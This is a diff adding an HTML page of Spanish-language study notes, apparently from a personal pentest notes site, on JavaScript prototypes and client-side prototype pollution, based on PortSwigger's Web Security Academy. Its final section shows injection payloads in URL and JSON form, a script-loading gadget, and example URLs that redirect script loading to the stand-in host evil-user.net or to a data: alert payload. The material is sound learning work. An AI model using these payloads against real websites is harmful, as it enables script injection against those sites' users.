@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;table&gt;  &lt;tbody&gt;    &lt;tr&gt;      &lt;td&gt;[JavaScript prototypes and inheritance&lt;/td&gt;      &lt;td&gt;Web Security Academy](https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance)&lt;/td&gt;    &lt;/tr&gt;  &lt;/tbody&gt;&lt;/table&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <table>
+  <tbody>
+    <tr>
+      <td>[JavaScript prototypes and inheritance</td>
+      <td>Web Security Academy](https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Usando DOM invader :
+<a href="https://portswigger.net/web-security/prototype-pollution/client-side#finding-client-side-prototype-pollution-sources-manually">Client-side prototype pollution vulnerabilities | Web Security Academy</a>
+<a href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution">Testing for client-side prototype pollution - PortSwigger</a></p>
+
+<p>Cada objeto en javascript está asignado a un objeto de otro tipo, por defecto :</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">myObject</span> <span class="o">=</span> <span class="p">{};</span>
+<span class="nb">Object</span><span class="p">.</span><span class="nf">getPrototypeOf</span><span class="p">(</span><span class="nx">myObject</span><span class="p">);</span>    <span class="c1">// Object.prototype</span>
+
+<span class="kd">let</span> <span class="nx">myString</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
+<span class="nb">Object</span><span class="p">.</span><span class="nf">getPrototypeOf</span><span class="p">(</span><span class="nx">myString</span><span class="p">);</span>    <span class="c1">// String.prototype</span>
+
+<span class="kd">let</span> <span class="nx">myArray</span> <span class="o">=</span> <span class="p">[];</span>
+<span class="nb">Object</span><span class="p">.</span><span class="nf">getPrototypeOf</span><span class="p">(</span><span class="nx">myArray</span><span class="p">);</span>	    <span class="c1">// Array.prototype</span>
+
+<span class="kd">let</span> <span class="nx">myNumber</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="nb">Object</span><span class="p">.</span><span class="nf">getPrototypeOf</span><span class="p">(</span><span class="nx">myNumber</span><span class="p">);</span>    <span class="c1">// Number.prototype</span>
+</code></pre></div></div>
+
+<p>Estos objetos heredan las propiedades de sus prototipos.
+Si un objeto no tiene una propiedad, se mira en su prototipo.
+Si creas un objeto vacío :</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">myObject</span> <span class="o">=</span> <span class="p">{};</span>
+</code></pre></div></div>
+
+<p>Y miras sus propiedades, si que tendrá las propiedades de Object.prototype por defecto.</p>
+
+<p>Para ver las propiedades de su prototipo:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">username</span><span class="p">.</span><span class="nx">__proto__</span> 
+<span class="nx">username</span><span class="p">[</span><span class="dl">'</span><span class="s1">__proto__</span><span class="dl">'</span><span class="p">]</span>
+</code></pre></div></div>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">username</span><span class="p">.</span><span class="nx">__proto__</span>                        <span class="c1">// String.prototype</span>
+<span class="nx">username</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">__proto__</span>              <span class="c1">// Object.prototype</span>
+<span class="nx">username</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">__proto__</span>    <span class="c1">// null</span>
+</code></pre></div></div>
+
+<p>Se pueden crear :</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">String</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">removeWhitespace</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
+    <span class="c1">// remove leading and trailing whitespace</span>
+<span class="p">}</span>
+
+<span class="kd">let</span> <span class="nx">searchTerm</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">  example </span><span class="dl">"</span><span class="p">;</span>
+<span class="nx">searchTerm</span><span class="p">.</span><span class="nf">removeWhitespace</span><span class="p">();</span>    <span class="c1">// "example"</span>
+</code></pre></div></div>
+
+<hr />
+
+<p>URL :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://vulnerable-website.com/?__proto__[evilProperty]=payload
+</code></pre></div></div>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">targetObject</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">evilProperty</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">payload</span><span class="dl">'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>JSON:</p>
+
+<p>Inyectar esto :</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"__proto__"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"evilProperty"</span><span class="p">:</span><span class="w"> </span><span class="s2">"payload"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">objectFromJson</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="dl">'</span><span class="s1">{"__proto__": {"evilProperty": "payload"}}</span><span class="dl">'</span><span class="p">);</span>
+</code></pre></div></div>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">objectFromJson</span><span class="p">.</span><span class="nf">hasOwnProperty</span><span class="p">(</span><span class="dl">'</span><span class="s1">__proto__</span><span class="dl">'</span><span class="p">);</span> <span class="c1">// true</span>
+</code></pre></div></div>
+
+<p>Ejemplo de un gadget :</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">transport_url</span> <span class="o">=</span> <span class="nx">config</span><span class="p">.</span><span class="nx">transport_url</span> <span class="o">||</span> <span class="nx">defaults</span><span class="p">.</span><span class="nx">transport_url</span><span class="p">;</span>
+
+<span class="kd">let</span> <span class="nx">script</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">script</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">script</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">transport_url</span><span class="p">}</span><span class="s2">/example.js`</span><span class="p">;</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
+</code></pre></div></div>
+
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
